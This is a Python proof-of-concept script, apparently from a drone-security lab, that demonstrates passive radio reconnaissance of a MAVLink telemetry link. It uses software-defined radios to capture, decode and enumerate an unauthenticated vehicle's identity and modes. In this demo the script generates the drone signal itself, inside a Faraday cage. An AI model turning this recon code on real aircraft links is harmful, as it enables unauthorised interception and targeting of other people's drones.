#!/usr/bin/env python3
"""PoC 01 - MAVLink recon OVER-THE-AIR (PWNUAV RC-01/02/03, PA-02).

Discovers the drone by listening only: link fingerprint, MAVLink message
inventory, and vehicle enumeration (sysid, type, autopilot, modes). No auth.
Drone = Pluto TX ; attacker = RTL-SDR RX. ONLY in a Faraday cage. venv: .venv-radio
"""
from __future__ import annotations
import os
os.environ.setdefault("MAVLINK20", "1")  # emit MAVLink 2 (0xFD)
import threading, collections
from pymavlink import mavutil
from pwnuav.rf.gfsk import FS
from pwnuav.rf import hw
from pwnuav import demo

def main():
    mav = mavutil.mavlink.MAVLink(None, srcSystem=1, srcComponent=1)
    msgs = demo.telemetry_messages(mav)
    buf, frame_len = demo.downlink_iq(msgs, mav, reps=25)

    print(demo.rule("PWNUAV RECON — MAVLink over the air"))
    print(f"[*] SDR RX     : RTL-SDR @ 915.000 MHz  fs=1.0 Msps  gain=40 dB")
    print(f"[*] Victim link: Pluto TX  GFSK 100 kbps  dev 25 kHz  (drone downlink)")
    print(f"[*] Capturing 2.0 s of spectrum ...")

    stop = threading.Event()
    def tx():
        d, st = hw.open_tx("plutosdr"); hw.transmit(d, st, buf, 2.5); hw.close(d, st)
    rxd, rxst = hw.open_rx("rtlsdr")
    t = threading.Thread(target=tx, daemon=True); t.start()
    s = hw.capture(rxd, rxst, 2.0); hw.close(rxd, rxst); t.join(timeout=3)
    frames = hw.decode_messages(s, frame_len)
    print(f"[*] Captured {len(s):,} IQ samples ; {len(frames)} MAVLink frames recovered\n")

    # [RC-02] link fingerprint
    print("[RC-02] LINK FINGERPRINT")
    print("  modulation : GFSK  BT=0.5  h=0.5")
    print("  framing    : PREAMBLE(0x55 x8) + SYNC(0x2D D4) + MAVLink2 + CRC-16")
    print(f"  carrier    : 915.000 MHz   frames/2s : {len(frames)}\n")

    # [PA-02] message inventory
    inv = collections.Counter((m.get_msgId(), m.get_type()) for m in frames)
    print("[PA-02] MAVLINK MESSAGE INVENTORY")
    print("  MSGID  NAME                        COUNT")
    for (mid, name), c in sorted(inv.items()):
        print(f"  {mid:<5}  {name:<26}  {c}")
    print()

    # [RC-03] vehicle enumeration
    hb = next((m for m in frames if m.get_type() == "HEARTBEAT"), None)
    print("[RC-03] VEHICLE ENUMERATION")
    if hb:
        print(f"  system id      : {hb.get_srcSystem()}")
        print(f"  component id   : {hb.get_srcComponent()}  ({demo.enum_name('MAV_COMPONENT', hb.get_srcComponent())})")
        print(f"  vehicle type   : {hb.type}  {demo.enum_name('MAV_TYPE', hb.type)}")
        print(f"  autopilot      : {hb.autopilot}  {demo.enum_name('MAV_AUTOPILOT', hb.autopilot)}")
        print(f"  base_mode      : 0x{hb.base_mode:02X}  [{' | '.join(demo.base_mode_flags(hb.base_mode))}]")
        print(f"  custom_mode    : {hb.custom_mode}")
        print(f"  system_status  : {hb.system_status}  {demo.enum_name('MAV_STATE', hb.system_status)}")
        print(f"  mavlink version: {hb.mavlink_version}")
    print()

    # sample raw frame (as transmitted on the air)
    raw = dict(msgs)["HEARTBEAT"].pack(mav)
    print("[*] SAMPLE HEARTBEAT — raw MAVLink 2 frame on the air")
    print(demo.hexdump(raw))
    print()
    ok = hb is not None
    print("[+] RECON COMPLETE — 1 vehicle fingerprinted with ZERO authentication." if ok else "[-] no vehicle found")
    return 0 if ok else 1

if __name__ == "__main__":
    raise SystemExit(main())
